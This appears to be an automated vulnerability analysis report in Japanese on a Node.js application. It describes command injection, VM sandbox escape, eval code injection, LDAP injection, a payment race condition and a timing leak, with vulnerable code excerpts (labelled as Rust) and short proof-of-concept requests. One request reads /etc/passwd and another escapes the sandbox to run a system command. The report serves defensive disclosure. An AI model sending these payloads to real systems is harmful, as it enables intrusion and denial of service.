# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 85**

## 脆弱性タイプ

- `RCE`
- `AFO`
- `IDOR`

## 解析結果

このアプリケーションには多数の重大な脆弱性が含まれています。

1. ビジネスロジックのバイパス・レースコンディション (processPayment): 管理者トークンを与えるだけで金額を不正に乗算でき、TOCTOUのタイミングウィンドウで二重支払いや残高操作が可能です。
2. ファイル操作の脆弱性 (file/advanced-ops): パス・トラバーサル、任意ファイル書き込み、コマンドインジェクションが混在し、execSyncによるシェル実行でRCEが容易です。
3. VM サンドボックス脱出 (vm/execute): globalやprocessを公開し、constructor.constructorを使ったプロセス制御が可能で、タイムアウト制限も回避できます。
4. GraphQL ライクなクエリインジェクション (query/graph): evalを直接呼び出す設計で、ユーザ入力を含むクエリから任意コード実行が可能です。
5. LDAP インジェクション (ldap/search): フィルタ文字列を無検証で連結し、LDAPクエリを改竄できます。
6. タイミング攻撃 (distributed/coordinate): シークレット照合を文字ごとの遅延比較で行っており、タイミング攻撃により秘密値を漏洩できます。

## PoC（概念実証コード）

```text
1) ファイルコマンドインジェクション例
   POST /file/advanced-ops
   {"operation":"exec","source":"/etc/passwd"}
   => /etc/passwdの内容が取得可能

2) GraphQL-like RCE例
   POST /query/graph
   {"query":"{constructor.constructor('return process')().exit()}"}
   => サーバープロセスを強制終了

3) VM脱出例
   POST /vm/execute
   {"code":"return constructor.constructor('return require(\'child_process\').execSync(\'id\' )')()","context":{}}
   => 任意システムコマンド実行
```

## 関連コードコンテキスト

### 関数名: processPayment (レースコンディション)
- 理由: TOCTOUにより残高チェック後に別リクエストで残高を変更可能
- パス: routes/advanced.js
```rust
await new Promise(resolve => setTimeout(resolve, 100));
```

### 関数名: file/advanced-ops (コマンドインジェクション)
- 理由: user入力をそのままシェルコマンドに連結しRCEを誘発
- パス: routes/advanced.js
```rust
const output = execSync(`cat ${source} | head -10`, { encoding: 'utf8' });
```

### 関数名: vm/execute (VMサンドボックス脱出)
- 理由: globalやprocessを公開しconstructor.constructorによる脱出を許可
- パス: routes/advanced.js
```rust
script.runInNewContext(vmContext, { timeout });
```

### 関数名: query/graph (コードインジェクション)
- 理由: ユーザ制御のfieldをevalで実行できる設計
- パス: routes/advanced.js
```rust
return eval(field);
```

### 関数名: ldap/search (LDAPインジェクション)
- 理由: username, filterを無検証でLDAPフィルタに結合
- パス: routes/advanced.js
```rust
let ldapQuery = `(&(objectClass=person)(uid=${username})`;
```

### 関数名: distributed/coordinate (タイミング攻撃)
- 理由: 文字ごとの遅延比較で秘密文字列の照合時間を情報漏洩
- パス: routes/advanced.js
```rust
await new Promise(resolve => setTimeout(resolve, 10));
```

## 解析ノート

・プロセス支払いロジック: TOCTOU と adminToken チェックのバイパス
・ファイル操作: path traversal / write / execSync
・vm: sandbox に global/process を注入 -> constructor.constructor 脱出
・graph: eval(field) 組み込み -> コード実行
・ldap: フィルタ文字列の無検証連結
・distributed: 文字毎の setTimeout で秘密文字漏洩のチャンネル
・vulnerability_types: RCE, AFO, IDOR

